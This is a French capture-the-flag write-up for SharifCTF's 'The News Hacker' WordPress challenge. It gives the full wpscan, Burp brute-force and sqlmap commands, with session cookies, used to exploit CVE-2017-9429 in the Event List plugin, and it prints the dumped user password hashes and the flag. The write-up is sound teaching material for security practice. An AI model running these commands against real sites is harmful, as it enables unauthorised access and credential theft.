**Web - The News Hacker  - 150pts**

Enoncé :
```
Only admin can see the flag :)
ctf.sharif.edu:8082
Hint: Weak password!
```

**Résolution :**

Le site est un wordpress :

![Alt](img/wordpress.png "Accueil")

On commence par le scanner pour identifier les différentes versions des plugins et lister les utilisateurs.

```BASH
wpscan --url http://ctf.sharif.edu:8082 --enumerate u
```

**Résultat :**

Deux utilisateurs sont présent sur le système :
   +----+-----------+-----------+
    | Id | Login     | Name      |
    +----+-----------+-----------+
    | 1  | admin     | admin     |
    | 2  | organizer | organizer |
    +----+-----------+-----------+

 ```
Un plugin est vulnérable à une injection SQL authentifié :

```
[!] Title: Event List <= 0.7.8 - Authenticated SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/8846
    Reference: https://dtsa.eu/cve-2017-9429-event-list-version-v-0-7-8-blind-based-sql-injection-sqli/
    Reference: https://plugins.trac.wordpress.org/changeset/1676971/event-list
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9429
[i] Fixed in: 0.7.9

```


On bruteforce l'accès à l'administration du wordpress via la page **wp-login.php** avec burp et le dictionnaire rockyou


![Alt](img/burp.png "Bruteforce")


On trouve le couple d'identifiant :  organizer / password

On se connecte grâce aux identitifants 

![Alt](img/admin.png "Admin page")

Nous avons maintenant un cookie de session valide pour exploiter l'injection sql en mode authentifié : [CVE-2017-9429](https://dtsa.eu/cve-2017-9429-event-list-version-v-0-7-8-blind-based-sql-injection-sqli/)

Avec SQLMAP on injecte sur le paramètre **id**:
```BASH
sqlmap -u "http://ctf.sharif.edu:8082/wp-admin/admin.php?page=el_admin_main&action=edit&id=1  AND SLEEP(2)" --cookie="wordpress_0a035233da76ab47b383406952116587=organizer%7C1517739757%7CBvi9HeOuVUVjGtcTlFxeK0w6ikHvbjQ63cH4No4fKvt%7Cc2da9849c840a893d0cf33bf38bd75a9a7af23367151b471e912be06963bb21b; csrftoken=gMHcyH05di9Nbae4Nob9iz8jXKN7twztLs2V0Zl55nC4mDQJEoEBxFf1ClV1cX5O; sessionid=h7xiiydxhmcqd3u9vij4p1c75fwaiis1; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_0a035233da76ab47b383406952116587=organizer%7C1517739757%7CBvi9HeOuVUVjGtcTlFxeK0w6ikHvbjQ63cH4No4fKvt%7Cabf11d732008c12922d0e7101ddcf906203f47813221521c84eb51bdf1180e64; wp-settings-2=libraryContent%3Dupload%26mfold%3Do%26editor%3Dtinymce%26uploader%3D1; wp-settings-time-2=1517567162" -p id
```

L'injection fonctionne, il ne reste plus qu'à afficher le contenu de la base de données désirée.

La première idée à été de dumper le mot de passe du compte : admin

```BASH
sqlmap -u "http://ctf.sharif.edu:8082/wp-admin/admin.php?page=el_admin_main&action=edit&id=1  AND SLEEP(2)" --cookie="wordpress_0a035233da76ab47b383406952116587=organizer%7C1517739757%7CBvi9HeOuVUVjGtcTlFxeK0w6ikHvbjQ63cH4No4fKvt%7Cc2da9849c840a893d0cf33bf38bd75a9a7af23367151b471e912be06963bb21b; csrftoken=gMHcyH05di9Nbae4Nob9iz8jXKN7twztLs2V0Zl55nC4mDQJEoEBxFf1ClV1cX5O; sessionid=h7xiiydxhmcqd3u9vij4p1c75fwaiis1; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_0a035233da76ab47b383406952116587=organizer%7C1517739757%7CBvi9HeOuVUVjGtcTlFxeK0w6ikHvbjQ63cH4No4fKvt%7Cabf11d732008c12922d0e7101ddcf906203f47813221521c84eb51bdf1180e64; wp-settings-2=libraryContent%3Dupload%26mfold%3Do%26editor%3Dtinymce%26uploader%3D1; wp-settings-time-2=1517567162" -p id -D wp_blog -T wp_users --dump


Database: wp_blog
Table: wp_users
[2 entries]
+----+----------+------------------------------------+------------+-------------------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
| ID | user_url | user_pass                          | user_login | user_email              | user_status | display_name | user_nicename | user_registered     | user_activation_key                           |
+----+----------+------------------------------------+------------+-------------------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
| 1  | <blank>  | $P$BlswVddCYusVLzt8kbJ2IgtYAzjfFV. | admin      | info@besthackers.com    | 0           | admin        | admin         | 2018-01-01 07:38:36 | <blank>                                       |
| 2  | <blank>  | $P$ByyRxRMg.AIWvtbM1Jf3A0Obt/oEJy1 | organizer  | organizer@sharifctf.com | 0           | organizer    | organizer     | 2018-01-08 04:16:36 | 1515384996:$P$B8XHeMJAc23PiQ.TKcINv40EoS4jUV1 |
+----+----------+------------------------------------+------------+-------------------------+-------------+--------------+---------------+--------------------

```
Après une heure de bruteforce offline avec hashcat le mot de passe n'a pas été trouvé.

On dump alors tous les posts du wordpress en espérant en trouver un de caché.

```BASH
sqlmap -u "http://ctf.sharif.edu:8082/wp-admin/admin.php?page=el_admin_main&action=edit&id=1  AND SLEEP(2)" --cookie="wordpress_0a035233da76ab47b383406952116587=organizer%7C1517745041%7CaFwFCjTZRnFNkPPS2tgadihYPOnZegBYj4uGZLE1d4h%7C3fc24876b5521be0e1075ce103b2f76d4d044237e9f5682d978e7a281e313f34; csrftoken=gMHcyH05di9Nbae4Nob9iz8jXKN7twztLs2V0Zl55nC4mDQJEoEBxFf1ClV1cX5O; sessionid=h7xiiydxhmcqd3u9vij4p1c75fwaiis1; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_0a035233da76ab47b383406952116587=organizer%7C1517745041%7CaFwFCjTZRnFNkPPS2tgadihYPOnZegBYj4uGZLE1d4h%7C8d85976e7e3fe45466237298692e0a71ef640c92b24fc99e1f7c6b2c771bc251; wp-settings-2=libraryContent%3Dbrowse%26mfold%3Do%26editor%3Dhtml%26uploader%3D1; wp-settings-time-2=1517572245; XSRF-TOKEN=eyJpdiI6ImpzTE9IT01LWEZhMVdIY3A0NURKTVE9PSIsInZhbHVlIjoiRG1qZVkyTTkxU2VsMlJJNzFFbiswbkVEU2dPZzYzNEZidHIwVkE5QnVQZnJ3XC9pcHpIUnJDOE9ZTCtFMUhJWm52WnBTM2lUdTNqRGlNNXhqSk9IRHVnPT0iLCJtYWMiOiIyM2U0M2I2NGUyYThlODZkMjE5ZGM0MTFjNWM5NzczNmVkOGE4ZjUyNjBiMjg5MWY1ZjNhYTczMzFlOTc3N2IxIn0%3D; laravel_session=eyJpdiI6IlRodmZ3YUc5K2pHSzJkUmtBSWwzMUE9PSIsInZhbHVlIjoibkhXXC9mQ2RRMWFkWkpEc0FYdk5qVHhZVlZZSGpaNFdyWU1RMStwSzdHU0U3RkJua3RMM1l4bHFJbXB3Zzd5NW44UUJ4U3E0YnRMcWlJb0Rzd21oYmlBPT0iLCJtYWMiOiI3ZWVlMGYyYWIyMDgxOWFkYjZjN2Y0YzNhZDAyZTdhNDMzMWM1M2EzMTE1ZjRhN2M0YjM2OWM0ZDU0YzI5MGQ5In0%3" -p id -D wp_blog -T wp_posts --dump



[13:22:35] [INFO] retrieved: "25","0","open","http://10.0.3.189/?p=25","0","open","","1","Flag is SharifCTF{e7134abea7438e937b87608eab0d979c}","","2018-01-08 04:14:21","2018-01-08 04:14:21","","","2018-01-08 10:5...
```



By team Beers4Flags


```
 ________
|        |
|  #BFF  |
|________|
   _.._,_|,_
  (      |   )
   ]~,"-.-~~[
 .=] Beers ([
 | ])  4   ([
 '=]) Flags [
   |:: '    |
    ~~----~~
```
